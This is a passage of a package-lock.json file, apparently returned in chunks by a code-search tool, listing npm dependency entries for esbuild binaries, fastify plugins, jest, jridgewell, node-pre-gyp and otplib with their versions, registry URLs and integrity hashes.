\"sha512-p4bm9+wsPwup5Z8f4EpfN63qNagQ47Ua2znaqGH6bqLlmJ4bx97Y9JdqxgGZ6Y8xVTixUnEkoKSHcpRlDnNr5w==\",\n      \"cpu\": [\n        \"s390x\"\n      ],\n      \"dev\": true,\n      \"license\": \"MIT\",\n      \"optional\": true,\n      \"os\": [\n        \"linux\"\n      ],\n      \"engines\": {\n        \"node\": \">=18\"\n      }\n    },\n    \"node_modules/@esbuild/linux-x64\": {\n      \"version\": \"0.27.2\",\n      \"resolved\": \"https://registry.npmjs.org/@esbuild/linux-x64/-/linux-x64-0.27.2.tgz\",\n      \"integrity\": \"sha512-uwp2Tip5aPmH+NRUwTcfLb+W32WXjpFejTIOWZFw/v7/KnpCDKG66u4DLcurQpiYTiYwQ9B7KOeMJvLCu/OvbA==\",\n      \"cpu\": [\n        \"x64\"\n      ],\n      \"dev\": true,\n      \"license\": \"MIT\",\n      \"optional\": true,\n      \"os\": [\n        \"linux\"\n      ],\n      \"engines\": {\n        \"node\": \">=18\"\n      }\n    },\n    \"node_modules/@esbuild/netbsd-arm64\": {\n      \"version\": \"0.27.2\",\n      \"resolved\": \"https://registry.npmjs.org/@esbuild/netbsd-arm64/-/netbsd-arm64-0.27.2.tgz\",\n      \"integrity\": \"sha512-Kj6DiBlwXrPsCRDeRvGAUb/LNrBASrfqAIok+xB0LxK8CHqxZ037viF13ugfsIpePH93mX7xfJp97cyDuTZ3cw==\",\n      \"cpu\": [\n        \"arm64\"\n      ],\n      \"dev\": true,\n      \"license\": \"MIT\",\n      \"optional\": true,\n      \"os\": [\n        \"netbsd\"\n      ],\n      \"engines\": {\n        \"node\": \">=18\"\n      }\n    },\n    \"node_modules/@esbuild/netbsd-x64\": {\n      \"version\": \"0.27.2\",\n      \"resolved\": \"https://registry.npmjs.org/@esbuild/netbsd-x64/-/netbsd-x64-0.27.2.tgz\",\n      \"integrity\": \"sha512-HwGDZ0VLVBY3Y+Nw0JexZy9o/nUAWq9MlV7cahpaXKW6TOzfVno3y3/M8Ga8u8Yr7GldLOov27xiCnqRZf0tCA==\",\n      \"cpu\": [\n        \"x64\"\n      ],\n      \"dev\": true,\n      \"license\": \"MIT\",\n      \"optional\": true,\n      \"os\": [\n        \"netbsd\"\n      ],\n      \"engines\": {\n        \"node\": \">=18\"\n      }\n    },\n    \"node_modules/@esbuild/openbsd-arm64\": {\n      \"version\": \"0.27.2\",\n      \"resolved\": \"https://registry.npmjs.org/@esbuild/openbsd-arm64/-/openbsd-arm64-0.27.2.tgz\",\n      \"integrity\": \"sha512-DNIHH2BPQ5551A7oSHD0CKbwIA/Ox7+78/AWkbS5QoRzaqlev2uFayfSxq68EkonB+IKjiuxBFoV8ESJy8bOHA==\",\n      \"cpu\": [\n        \"arm64\"\n      ],\n      \"dev\": true,\n      \"license\": \"MIT\",\n      \"optional\": true,\n      \"os\": [\n        \"openbsd\"\n      ],\n      \"engines\": {\n        \"node\": \">=18\"\n      }\n    },\n    \"node_modules/@esbuild/openbsd-x64\": {\n      \"version\": \"0.27.2\",\n      \"resolved\": \"https://registry.npmjs.org/@esbuild/openbsd-x64/-/openbsd-x64-0.27.2.tgz\",\n      \"integrity\": \"sha512-/it7w9Nb7+0KFIzjalNJVR5bOzA9Vay+yIPLVHfIQYG/j+j9VTH84aNB8ExGKPU4AzfaEvN9/V4HV+F+vo8OEg==\",\n      \"cpu\": [\n        \"x64\"\n      ],\n      \"dev\": true,\n      \"license\": \"MIT\",\n      \"optional\": true,\n      \"os\": [\n        \"openbsd\"\n      ],\n      \"engines\": {\n        \"node\": \">=18\"\n      }\n    },\n    \"node_modules/@esbuild/openharmony-arm64\": {\n      \"version\": \"0.27.2\",\n      \"resolved\": \"https://registry.npmjs.org/@esbuild/openharmony-arm64/-/openharmony-arm64-0.27.2.tgz\",\n      \"integrity\": \"sha512-LRBbCmiU51IXfeXk59csuX/aSaToeG7w48nMwA6049Y4J4+VbWALAuXcs+qcD04rHDuSCSRKdmY63sruDS5qag==\",\n      \"cpu\": [\n        \"arm64\"\n      ],\n      \"dev\": true,\n      \"license\": \"MIT\",\n      \"optional\": true,\n      \"os\": [\n        \"openharmony\"\n      ],\n      \"engines\": {\n        \"node\": \">=18\"\n      }\n    },\n    \"node_modules/@esbuild/sunos-x64\": {\n      \"version\": \"0.27.2\",\n      \"resolved\": \"https://registry.npmjs.org/@esbuild/sunos-x64/-/sunos-x64-0.27.2.tgz\",\n      \"integrity\": \"sha512-kMtx1yqJHTmqaqHPAzKCAkDaKsffmXkPHThSfRwZGyuqyIeBvf08KSsYXl+abf5HDAPMJIPnbBfXvP2ZC2TfHg==\",\n      \"cpu\": [\n        \"x64\"\n      ],\n      \"dev\": true,\n      \"license\": \"MIT\",\n      \"optional\": true,\n      \"os\": [\n        \"sunos\"\n      ],\n      \"engines\": {\n        \"node\": \">=18\"\n      }\n    },\n    \"node_modules/@esbuild/win32-arm64\": {\n      \"version\": \"0.27.2\",\n      \"resolved\": \"https://registry.npmjs.org/@esbuild/win32-arm64/-/win32-arm64-0.27.2.tgz\",\n      \"integrity\": \"sha512-Yaf78O/B3Kkh+nKABUF++bvJv5Ijoy9AN1ww904rOXZFLWVc5OLOfL56W+C8F9xn5JQZa3UX6m+IktJnIb1Jjg==\",\n      \"cpu\": [\n        \"arm64\"\n      ],\n      \"dev\": true,\n      \"license\": \"MIT\",\n      \"optional\": true,\n      \"os\": [\n        \"win32\"\n      ],\n      \"engines\": {\n        \"node\": \">=18\"\n      }\n    },\n    \"node_modules/@esbuild/win32-ia32\": {\n      \"version\": \"0.27.2\",\n      \"resolved\": \"https://registry.npmjs.org/@esbuild/win32-ia32/-/win32-ia32-0.27.2.tgz\",\n      \"integrity\": \"sha512-Iuws0kxo4yusk7sw70Xa2E2imZU5HoixzxfGCdxwBdhiDgt9vX9VUCBhqcwY7/uh//78A1hMkkROMJq9l27oLQ==\",\n      \"cpu\": [\n        \"ia32\"\n      ],\n      \"dev\": true,\n      \"license\": \"MIT\",\n      \"optional\": true,\n      \"os\": [\n        \"win32\"\n      ],\n      \"engines\": {\n        \"node\": \">=18\"\n      }\n    },\n    \"node_modules/@esbuild/win32-x64\": {\n      \"version\": \"0.27.2\",\n      \"resolved\": \"https://registry.npmjs.org/@esbuild/win32-x64/-/win32-x64-0.27.2.tgz\",\n      \"integrity\": \"sha512-sRdU18mcKf7F+YgheI/zGf5alZatMUTKj/jNS6l744f9u3WFu4v7twcUI9vu4mknF4Y9aDlblIie0IM+5xxaqQ==\",\n      \"cpu\": [\n        \"x64\"\n      ],\n      \"dev\": true,\n      \"license\": \"MIT\",\n      \"optional\": true,\n      \"os\": [\n        \"win32\"\n      ],\n      \"engines\": {\n        \"node\": \">=18\"\n      }\n    },\n    \"node_modules/@fastify/accept-negotiator\": {\n      \"version\": \"1.1.0\",", "metadata": {"file": "package-lock.json", "start_line": 601, "end_line": 800, "language": "json"}}, {"corpus": "code", "source": "package-lock.json", "location": "package-lock.json:801", "score": 0.0, "content": "      \"resolved\": \"https://registry.npmjs.org/@fastify/accept-negotiator/-/accept-negotiator-1.1.0.tgz\",\n      \"integrity\": \"sha512-OIHZrb2ImZ7XG85HXOONLcJWGosv7sIvM2ifAPQVhg9Lv7qdmMBNVaai4QTdyuaqbKM5eO6sLSQOYI7wEQeCJQ==\",\n      \"license\": \"MIT\",\n      \"engines\": {\n        \"node\": \">=14\"\n      }\n    },\n    \"node_modules/@fastify/ajv-compiler\": {\n      \"version\": \"3.6.0\",\n      \"resolved\": \"https://registry.npmjs.org/@fastify/ajv-compiler/-/ajv-compiler-3.6.0.tgz\",\n      \"integrity\": \"sha512-LwdXQJjmMD+GwLOkP7TVC68qa+pSSogeWWmznRJ/coyTcfe9qA05AHFSe1eZFwK6q+xVRpChnvFUkf1iYaSZsQ==\",\n      \"license\": \"MIT\",\n      \"dependencies\": {\n        \"ajv\": \"^8.11.0\",\n        \"ajv-formats\": \"^2.1.1\",\n        \"fast-uri\": \"^2.0.0\"\n      }\n    },\n    \"node_modules/@fastify/busboy\": {\n      \"version\": \"3.2.0\",\n      \"resolved\": \"https://registry.npmjs.org/@fastify/busboy/-/busboy-3.2.0.tgz\",\n      \"integrity\": \"sha512-m9FVDXU3GT2ITSe0UaMA5rU3QkfC/UXtCU8y0gSN/GugTqtVldOBWIB5V6V3sbmenVZUIpU6f+mPEO2+m5iTaA==\",\n      \"license\": \"MIT\"\n    },\n    \"node_modules/@fastify/cookie\": {\n      \"version\": \"9.4.0\",\n      \"resolved\": \"https://registry.npmjs.org/@fastify/cookie/-/cookie-9.4.0.tgz\",\n      \"integrity\": \"sha512-Th+pt3kEkh4MQD/Q2q1bMuJIB5NX/D5SwSpOKu3G/tjoGbwfpurIMJsWSPS0SJJ4eyjtmQ8OipDQspf8RbUOlg==\",\n      \"license\": \"MIT\",\n      \"dependencies\": {\n        \"cookie-signature\": \"^1.1.0\",\n        \"fastify-plugin\": \"^4.0.0\"\n      }\n    },\n    \"node_modules/@fastify/cors\": {\n      \"version\": \"9.0.1\",\n      \"resolved\": \"https://registry.npmjs.org/@fastify/cors/-/cors-9.0.1.tgz\",\n      \"integrity\": \"sha512-YY9Ho3ovI+QHIL2hW+9X4XqQjXLjJqsU+sMV/xFsxZkE8p3GNnYVFpoOxF7SsP5ZL76gwvbo3V9L+FIekBGU4Q==\",\n      \"license\": \"MIT\",\n      \"dependencies\": {\n        \"fastify-plugin\": \"^4.0.0\",\n        \"mnemonist\": \"0.39.6\"\n      }\n    },\n    \"node_modules/@fastify/deepmerge\": {\n      \"version\": \"2.0.2\",\n      \"resolved\": \"https://registry.npmjs.org/@fastify/deepmerge/-/deepmerge-2.0.2.tgz\",\n      \"integrity\": \"sha512-3wuLdX5iiiYeZWP6bQrjqhrcvBIf0NHbQH1Ur1WbHvoiuTYUEItgygea3zs8aHpiitn0lOB8gX20u1qO+FDm7Q==\",\n      \"funding\": [\n        {\n          \"type\": \"github\",\n          \"url\": \"https://github.com/sponsors/fastify\"\n        },\n        {\n          \"type\": \"opencollective\",\n          \"url\": \"https://opencollective.com/fastify\"\n        }\n      ],\n      \"license\": \"MIT\"\n    },\n    \"node_modules/@fastify/error\": {\n      \"version\": \"4.2.0\",\n      \"resolved\": \"https://registry.npmjs.org/@fastify/error/-/error-4.2.0.tgz\",\n      \"integrity\": \"sha512-RSo3sVDXfHskiBZKBPRgnQTtIqpi/7zhJOEmAxCiBcM7d0uwdGdxLlsCaLzGs8v8NnxIRlfG0N51p5yFaOentQ==\",\n      \"funding\": [\n        {\n          \"type\": \"github\",\n          \"url\": \"https://github.com/sponsors/fastify\"\n        },\n        {\n          \"type\": \"opencollective\",\n          \"url\": \"https://opencollective.com/fastify\"\n        }\n      ],\n      \"license\": \"MIT\"\n    },\n    \"node_modules/@fastify/fast-json-stringify-compiler\": {\n      \"version\": \"4.3.0\",\n      \"resolved\": \"https://registry.npmjs.org/@fastify/fast-json-stringify-compiler/-/fast-json-stringify-compiler-4.3.0.tgz\",\n      \"integrity\": \"sha512-aZAXGYo6m22Fk1zZzEUKBvut/CIIQe/BapEORnxiD5Qr0kPHqqI69NtEMCme74h+at72sPhbkb4ZrLd1W3KRLA==\",\n      \"license\": \"MIT\",\n      \"dependencies\": {\n        \"fast-json-stringify\": \"^5.7.0\"\n      }\n    },\n    \"node_modules/@fastify/helmet\": {\n      \"version\": \"11.1.1\",\n      \"resolved\": \"https://registry.npmjs.org/@fastify/helmet/-/helmet-11.1.1.tgz\",\n      \"integrity\": \"sha512-pjJxjk6SLEimITWadtYIXt6wBMfFC1I6OQyH/jYVCqSAn36sgAIFjeNiibHtifjCd+e25442pObis3Rjtame6A==\",\n      \"license\": \"MIT\",\n      \"dependencies\": {\n        \"fastify-plugin\": \"^4.2.1\",\n        \"helmet\": \"^7.0.0\"\n      }\n    },\n    \"node_modules/@fastify/merge-json-schemas\": {\n      \"version\": \"0.1.1\",\n      \"resolved\": \"https://registry.npmjs.org/@fastify/merge-json-schemas/-/merge-json-schemas-0.1.1.tgz\",\n      \"integrity\": \"sha512-fERDVz7topgNjtXsJTTW1JKLy0rhuLRcquYqNR9rF7OcVpCa2OVW49ZPDIhaRRCaUuvVxI+N416xUoF76HNSXA==\",\n      \"license\": \"MIT\",\n      \"dependencies\": {\n        \"fast-deep-equal\": \"^3.1.3\"\n      }\n    },\n    \"node_modules/@fastify/multipart\": {\n      \"version\": \"8.3.1\",\n      \"resolved\": \"https://registry.npmjs.org/@fastify/multipart/-/multipart-8.3.1.tgz\",\n      \"integrity\": \"sha512-pncbnG28S6MIskFSVRtzTKE9dK+GrKAJl0NbaQ/CG8ded80okWFsYKzSlP9haaLNQhNRDOoHqmGQNvgbiPVpWQ==\",\n      \"license\": \"MIT\",\n      \"dependencies\": {\n        \"@fastify/busboy\": \"^3.0.0\",\n        \"@fastify/deepmerge\": \"^2.0.0\",\n        \"@fastify/error\": \"^4.0.0\",\n        \"fastify-plugin\": \"^4.0.0\",\n        \"secure-json-parse\": \"^2.4.0\",\n        \"stream-wormhole\": \"^1.1.0\"\n      }\n    },\n    \"node_modules/@fastify/rate-limit\": {\n      \"version\": \"9.1.0\",\n      \"resolved\": \"https://registry.npmjs.org/@fastify/rate-limit/-/rate-limit-9.1.0.tgz\",\n      \"integrity\": \"sha512-h5dZWCkuZXN0PxwqaFQLxeln8/LNwQwH9popywmDCFdKfgpi4b/HoMH1lluy6P+30CG9yzzpSpwTCIPNB9T1JA==\",\n      \"license\": \"MIT\",\n      \"dependencies\": {\n        \"@lukeed/ms\": \"^2.0.1\",\n        \"fastify-plugin\": \"^4.0.0\",\n        \"toad-cache\": \"^3.3.1\"\n      }\n    },\n    \"node_modules/@fastify/send\": {\n      \"version\": \"2.1.0\",\n      \"resolved\": \"https://registry.npmjs.org/@fastify/send/-/send-2.1.0.tgz\",\n      \"integrity\": \"sha512-yNYiY6sDkexoJR0D8IDy3aRP3+L4wdqCpvx5WP+VtEU58sn7USmKynBzDQex5X42Zzvw2gNzzYgP90UfWShLFA==\",\n      \"license\": \"MIT\",\n      \"dependencies\": {\n        \"@lukeed/ms\": \"^2.0.1\",\n        \"escape-html\": \"~1.0.3\",\n        \"fast-decode-uri-component\": \"^1.0.1\",\n        \"http-errors\": \"2.0.0\",\n        \"mime\": \"^3.0.0\"\n      }\n    },\n    \"node_modules/@fastify/static\": {\n      \"version\": \"7.0.4\",\n      \"resolved\": \"https://registry.npmjs.org/@fastify/static/-/static-7.0.4.tgz\",\n      \"integrity\": \"sha512-p2uKtaf8BMOZWLs6wu+Ihg7bWNBdjNgCwDza4MJtTqg+5ovKmcbgbR9Xs5/smZ1YISfzKOCNYmZV8LaCj+eJ1Q==\",\n      \"license\": \"MIT\",\n      \"dependencies\": {\n        \"@fastify/accept-negotiator\": \"^1.0.0\",\n        \"@fastify/send\": \"^2.0.0\",\n        \"content-disposition\": \"^0.5.3\",\n        \"fastify-plugin\": \"^4.0.0\",\n        \"fastq\": \"^1.17.0\",\n        \"glob\": \"^10.3.4\"\n      }\n    },\n    \"node_modules/@fastify/websocket\": {\n      \"version\": \"10.0.1\",\n      \"resolved\": \"https://registry.npmjs.org/@fastify/websocket/-/websocket-10.0.1.tgz\",\n      \"integrity\": \"sha512-8/pQIxTPRD8U94aILTeJ+2O3el/r19+Ej5z1O1mXlqplsUH7KzCjAI0sgd5DM/NoPjAi5qLFNIjgM5+9/rGSNw==\",\n      \"license\": \"MIT\",\n      \"dependencies\": {\n        \"duplexify\": \"^4.1.2\",\n        \"fastify-plugin\": \"^4.0.0\",\n        \"ws\": \"^8.0.0\"\n      }\n    },\n    \"node_modules/@isaacs/cliui\": {\n      \"version\": \"8.0.2\",\n      \"resolved\": \"https://registry.npmjs.org/@isaacs/cliui/-/cliui-8.0.2.tgz\",\n      \"integrity\": \"sha512-O8jcjabXaleOG9DQ0+ARXWZBTfnP4WNAqzuiJK7ll44AmxGKv/J2M4TPjxjY3znBCfvBXFzucm1twdyFybFqEA==\",\n      \"license\": \"ISC\",\n      \"dependencies\": {\n        \"string-width\": \"^5.1.2\",\n        \"string-width-cjs\": \"npm:string-width@^4.2.0\",\n        \"strip-ansi\": \"^7.0.1\",\n        \"strip-ansi-cjs\": \"npm:strip-ansi@^6.0.1\",\n        \"wrap-ansi\": \"^8.1.0\",\n        \"wrap-ansi-cjs\": \"npm:wrap-ansi@^7.0.0\"\n      },\n      \"engines\": {\n        \"node\": \">=12\"\n      }\n    },\n    \"node_modules/@isaacs/cliui/node_modules/ansi-regex\": {\n      \"version\": \"6.2.2\",\n      \"resolved\": \"https://registry.npmjs.org/ansi-regex/-/ansi-regex-6.2.2.tgz\",\n      \"integrity\": \"sha512-Bq3SmSpyFHaWjPk8If9yc6svM8c56dB5BAtW4Qbw5jHTwwXXcTLoRMkpDJp6VL0XzlWaCHTXrkFURMYmD0sLqg==\",\n      \"license\": \"MIT\",\n      \"engines\": {\n        \"node\": \">=12\"\n      },\n      \"funding\": {\n        \"url\": \"https://github.com/chalk/ansi-regex?sponsor=1\"\n      }\n    },\n    \"node_modules/@isaacs/cliui/node_modules/ansi-styles\": {\n      \"version\": \"6.2.3\",\n      \"resolved\": \"https://registry.npmjs.org/ansi-styles/-/ansi-styles-6.2.3.tgz\",\n      \"integrity\": \"sha512-4Dj6M28JB+oAH8kFkTLUo+a2jwOFkuqb3yucU0CANcRRUbxS0cP0nZYCGjcc3BNXwRIsUVmDGgzawme7zvJHvg==\",", "metadata": {"file": "package-lock.json", "start_line": 801, "end_line": 1000, "language": "json"}}, {"corpus": "code", "source": "package-lock.json", "location": "package-lock.json:1001", "score": 0.0, "content": "      \"license\": \"MIT\",\n      \"engines\": {\n        \"node\": \">=12\"\n      },\n      \"funding\": {\n        \"url\": \"https://github.com/chalk/ansi-styles?sponsor=1\"\n      }\n    },\n    \"node_modules/@isaacs/cliui/node_modules/emoji-regex\": {\n      \"version\": \"9.2.2\",\n      \"resolved\": \"https://registry.npmjs.org/emoji-regex/-/emoji-regex-9.2.2.tgz\",\n      \"integrity\": \"sha512-L18DaJsXSUk2+42pv8mLs5jJT2hqFkFE4j21wOmgbUqsZ2hL72NsUU785g9RXgo3s0ZNgVl42TiHp3ZtOv/Vyg==\",\n      \"license\": \"MIT\"\n    },\n    \"node_modules/@isaacs/cliui/node_modules/string-width\": {\n      \"version\": \"5.1.2\",\n      \"resolved\": \"https://registry.npmjs.org/string-width/-/string-width-5.1.2.tgz\",\n      \"integrity\": \"sha512-HnLOCR3vjcY8beoNLtcjZ5/nxn2afmME6lhrDrebokqMap+XbeW8n9TXpPDOqdGK5qcI3oT0GKTW6wC7EMiVqA==\",\n      \"license\": \"MIT\",\n      \"dependencies\": {\n        \"eastasianwidth\": \"^0.2.0\",\n        \"emoji-regex\": \"^9.2.2\",\n        \"strip-ansi\": \"^7.0.1\"\n      },\n      \"engines\": {\n        \"node\": \">=12\"\n      },\n      \"funding\": {\n        \"url\": \"https://github.com/sponsors/sindresorhus\"\n      }\n    },\n    \"node_modules/@isaacs/cliui/node_modules/strip-ansi\": {\n      \"version\": \"7.1.2\",\n      \"resolved\": \"https://registry.npmjs.org/strip-ansi/-/strip-ansi-7.1.2.tgz\",\n      \"integrity\": \"sha512-gmBGslpoQJtgnMAvOVqGZpEz9dyoKTCzy2nfz/n8aIFhN/jCE/rCmcxabB6jOOHV+0WNnylOxaxBQPSvcWklhA==\",\n      \"license\": \"MIT\",\n      \"dependencies\": {\n        \"ansi-regex\": \"^6.0.1\"\n      },\n      \"engines\": {\n        \"node\": \">=12\"\n      },\n      \"funding\": {\n        \"url\": \"https://github.com/chalk/strip-ansi?sponsor=1\"\n      }\n    },\n    \"node_modules/@isaacs/cliui/node_modules/wrap-ansi\": {\n      \"version\": \"8.1.0\",\n      \"resolved\": \"https://registry.npmjs.org/wrap-ansi/-/wrap-ansi-8.1.0.tgz\",\n      \"integrity\": \"sha512-si7QWI6zUMq56bESFvagtmzMdGOtoxfR+Sez11Mobfc7tm+VkUckk9bW2UeffTGVUbOksxmSw0AA2gs8g71NCQ==\",\n      \"license\": \"MIT\",\n      \"dependencies\": {\n        \"ansi-styles\": \"^6.1.0\",\n        \"string-width\": \"^5.0.1\",\n        \"strip-ansi\": \"^7.0.1\"\n      },\n      \"engines\": {\n        \"node\": \">=12\"\n      },\n      \"funding\": {\n        \"url\": \"https://github.com/chalk/wrap-ansi?sponsor=1\"\n      }\n    },\n    \"node_modules/@jest/schemas\": {\n      \"version\": \"29.6.3\",\n      \"resolved\": \"https://registry.npmjs.org/@jest/schemas/-/schemas-29.6.3.tgz\",\n      \"integrity\": \"sha512-mo5j5X+jIZmJQveBKeS/clAueipV7KgiX1vMgCxam1RNYiqE1w62n0/tJJnHtjW8ZHcQco5gY85jA3mi0L+nSA==\",\n      \"dev\": true,\n      \"license\": \"MIT\",\n      \"dependencies\": {\n        \"@sinclair/typebox\": \"^0.27.8\"\n      },\n      \"engines\": {\n        \"node\": \"^14.15.0 || ^16.10.0 || >=18.0.0\"\n      }\n    },\n    \"node_modules/@jridgewell/gen-mapping\": {\n      \"version\": \"0.3.13\",\n      \"resolved\": \"https://registry.npmjs.org/@jridgewell/gen-mapping/-/gen-mapping-0.3.13.tgz\",\n      \"integrity\": \"sha512-2kkt/7niJ6MgEPxF0bYdQ6etZaA+fQvDcLKckhy1yIQOzaoKjBBjSj63/aLVjYE3qhRt5dvM+uUyfCg6UKCBbA==\",\n      \"dev\": true,\n      \"license\": \"MIT\",\n      \"dependencies\": {\n        \"@jridgewell/sourcemap-codec\": \"^1.5.0\",\n        \"@jridgewell/trace-mapping\": \"^0.3.24\"\n      }\n    },\n    \"node_modules/@jridgewell/remapping\": {\n      \"version\": \"2.3.5\",\n      \"resolved\": \"https://registry.npmjs.org/@jridgewell/remapping/-/remapping-2.3.5.tgz\",\n      \"integrity\": \"sha512-LI9u/+laYG4Ds1TDKSJW2YPrIlcVYOwi2fUC6xB43lueCjgxV4lffOCZCtYFiH6TNOX+tQKXx97T4IKHbhyHEQ==\",\n      \"dev\": true,\n      \"license\": \"MIT\",\n      \"dependencies\": {\n        \"@jridgewell/gen-mapping\": \"^0.3.5\",\n        \"@jridgewell/trace-mapping\": \"^0.3.24\"\n      }\n    },\n    \"node_modules/@jridgewell/resolve-uri\": {\n      \"version\": \"3.1.2\",\n      \"resolved\": \"https://registry.npmjs.org/@jridgewell/resolve-uri/-/resolve-uri-3.1.2.tgz\",\n      \"integrity\": \"sha512-bRISgCIjP20/tbWSPWMEi54QVPRZExkuD9lJL+UIxUKtwVJA8wW1Trb1jMs1RFXo1CBTNZ/5hpC9QvmKWdopKw==\",\n      \"dev\": true,\n      \"license\": \"MIT\",\n      \"engines\": {\n        \"node\": \">=6.0.0\"\n      }\n    },\n    \"node_modules/@jridgewell/sourcemap-codec\": {\n      \"version\": \"1.5.5\",\n      \"resolved\": \"https://registry.npmjs.org/@jridgewell/sourcemap-codec/-/sourcemap-codec-1.5.5.tgz\",\n      \"integrity\": \"sha512-cYQ9310grqxueWbl+WuIUIaiUaDcj7WOq5fVhEljNVgRfOUhY9fy2zTvfoqWsnebh8Sl70VScFbICvJnLKB0Og==\",\n      \"dev\": true,\n      \"license\": \"MIT\"\n    },\n    \"node_modules/@jridgewell/trace-mapping\": {\n      \"version\": \"0.3.31\",\n      \"resolved\": \"https://registry.npmjs.org/@jridgewell/trace-mapping/-/trace-mapping-0.3.31.tgz\",\n      \"integrity\": \"sha512-zzNR+SdQSDJzc8joaeP8QQoCQr8NuYx2dIIytl1QeBEZHJ9uW6hebsrYgbz8hJwUQao3TWCMtmfV8Nu1twOLAw==\",\n      \"dev\": true,\n      \"license\": \"MIT\",\n      \"dependencies\": {\n        \"@jridgewell/resolve-uri\": \"^3.1.0\",\n        \"@jridgewell/sourcemap-codec\": \"^1.4.14\"\n      }\n    },\n    \"node_modules/@lukeed/ms\": {\n      \"version\": \"2.0.2\",\n      \"resolved\": \"https://registry.npmjs.org/@lukeed/ms/-/ms-2.0.2.tgz\",\n      \"integrity\": \"sha512-9I2Zn6+NJLfaGoz9jN3lpwDgAYvfGeNYdbAIjJOqzs4Tpc+VU3Jqq4IofSUBKajiDS8k9fZIg18/z13mpk1bsA==\",\n      \"license\": \"MIT\",\n      \"engines\": {\n        \"node\": \">=8\"\n      }\n    },\n    \"node_modules/@mapbox/node-pre-gyp\": {\n      \"version\": \"1.0.11\",\n      \"resolved\": \"https://registry.npmjs.org/@mapbox/node-pre-gyp/-/node-pre-gyp-1.0.11.tgz\",\n      \"integrity\": \"sha512-Yhlar6v9WQgUp/He7BdgzOz8lqMQ8sU+jkCq7Wx8Myc5YFJLbEe7lgui/V7G1qB1DJykHSGwreceSaD60Y0PUQ==\",\n      \"license\": \"BSD-3-Clause\",\n      \"dependencies\": {\n        \"detect-libc\": \"^2.0.0\",\n        \"https-proxy-agent\": \"^5.0.0\",\n        \"make-dir\": \"^3.1.0\",\n        \"node-fetch\": \"^2.6.7\",\n        \"nopt\": \"^5.0.0\",\n        \"npmlog\": \"^5.0.1\",\n        \"rimraf\": \"^3.0.2\",\n        \"semver\": \"^7.3.5\",\n        \"tar\": \"^6.1.11\"\n      },\n      \"bin\": {\n        \"node-pre-gyp\": \"bin/node-pre-gyp\"\n      }\n    },\n    \"node_modules/@mapbox/node-pre-gyp/node_modules/node-fetch\": {\n      \"version\": \"2.7.0\",\n      \"resolved\": \"https://registry.npmjs.org/node-fetch/-/node-fetch-2.7.0.tgz\",\n      \"integrity\": \"sha512-c4FRfUm/dbcWZ7U+1Wq0AwCyFL+3nt2bEw05wfxSz+DWpWsitgmSgYmy2dQdWyKC1694ELPqMs/YzUSNozLt8A==\",\n      \"license\": \"MIT\",\n      \"dependencies\": {\n        \"whatwg-url\": \"^5.0.0\"\n      },\n      \"engines\": {\n        \"node\": \"4.x || >=6.0.0\"\n      },\n      \"peerDependencies\": {\n        \"encoding\": \"^0.1.0\"\n      },\n      \"peerDependenciesMeta\": {\n        \"encoding\": {\n          \"optional\": true\n        }\n      }\n    },\n    \"node_modules/@mapbox/node-pre-gyp/node_modules/semver\": {\n      \"version\": \"7.7.3\",\n      \"resolved\": \"https://registry.npmjs.org/semver/-/semver-7.7.3.tgz\",\n      \"integrity\": \"sha512-SdsKMrI9TdgjdweUSR9MweHA4EJ8YxHn8DFaDisvhVlUOe4BF1tLD7GAj0lIqWVl+dPb/rExr0Btby5loQm20Q==\",\n      \"license\": \"ISC\",\n      \"bin\": {\n        \"semver\": \"bin/semver.js\"\n      },\n      \"engines\": {\n        \"node\": \">=10\"\n      }\n    },\n    \"node_modules/@otplib/core\": {\n      \"version\": \"12.0.1\",\n      \"resolved\": \"https://registry.npmjs.org/@otplib/core/-/core-12.0.1.tgz\",\n      \"integrity\": \"sha512-4sGntwbA/AC+SbPhbsziRiD+jNDdIzsZ3JUyfZwjtKyc/wufl1pnSIaG4Uqx8ymPagujub0o92kgBnB89cuAMA==\",\n      \"license\": \"MIT\"\n    },\n    \"node_modules/@otplib/plugin-crypto\": {\n      \"version\": \"12.0.1\",\n      \"resolved\": \"https://registry.npmjs.org/@otplib/plugin-crypto/-/plugin-crypto-12.0.1.tgz\",\n      \"integrity\": \"sha512-qPuhN3QrT7ZZLcLCyKOSNhuijUi9G5guMRVrxq63r9YNOxxQjPm59gVxLM+7xGnHnM6cimY57tuKsjK7y9LM1g==\",\n      \"deprecated\": \"Please upgrade to v13 of otplib. Refer to otplib docs for migration paths\",\n      \"license\": \"MIT\",\n      \"dependencies\": {", "metadata": {"file": "package-lock.json", "start_line": 1001, "end_line": 1200, "language": "json"}}, {"corpus": "code", "source": "package-lock.json", "location": "package-lock.json:1201", "score": 0.0, "content": "        \"@otplib/core\": \"^12.0.1\"\n      }\n    },\n    \"node_modules/@otplib/plugin-thirty-two\": {\n      \"version\": \"12.0.1\",\n      \"resolved\": \"https://registry.npmjs.org/@otplib/plugin-thirty-two/-/plugin-thirty-two-12.0.1.tgz\",\n      \"integrity\": \"sha512-MtT+uqRso909UkbrrYpJ6XFjj9D+x2Py7KjTO9JDPhL0bJUYVu5kFP4TFZW4NFAywrAtFRxOVY261u0qwb93gA==\",\n      \"deprecated\": \"Please upgrade to v13 of otplib. Refer to otplib docs for migration paths\",\n      \"license\": \"MIT\",\n      \"dependencies\": {\n        \"@otplib/core\": \"^12.0.1\",\n        \"thirty-two\": \"^1.0.2\"\n      }\n    },\n    \"node_modules/@otplib/preset-default\": {\n      \"version\": \"12.0.1\",\n      \"resolved\": \"https://registry.npmjs.org/@otplib/preset-default/-/preset-default-12.0.1.tgz\",\n      \"integrity\": \"sha512-xf1v9oOJRyXfluBhMdpOkr+bsE+Irt+0D5uHtvg6x1eosfmHCsCC6ej/m7FXiWqdo0+ZUI6xSKDhJwc8yfiOPQ==\",\n      \"deprecated\": \"Please upgrade to v13 of otplib. Refer to otplib docs for migration paths\",\n      \"license\": \"MIT\",\n      \"dependencies\": {\n        \"@otplib/core\": \"^12.0.1\",\n        \"@otplib/plugin-crypto\": \"^12.0.1\",\n        \"@otplib/plugin-thirty-two\": \"^12.0.1\"\n      }\n    },\n    \"node_modules/@otplib/preset-v11\": {\n      \"version\": \"12.0.1\",\n      \"resolved\": \"https://registry.npmjs.org/@otplib/preset-v11/-/preset-v11-12.0.1.tgz\",\n      \"integrity\": \"sha512-9hSetMI7ECqbFiKICrNa4w70deTUfArtwXykPUvSHWOdzOlfa9ajglu7mNCntlvxycTiOAXkQGwjQCzzDEMRMg==\",\n      \"license\": \"MIT\",\n      \"dependencies\": {\n        \"@otplib/core\": \"^12.0.1\",\n        \"@otplib/plugin-crypto\": \"^12.0.1\",\n        \"@otplib/plugin-thirty-two\": \"^12.0.1\"\n      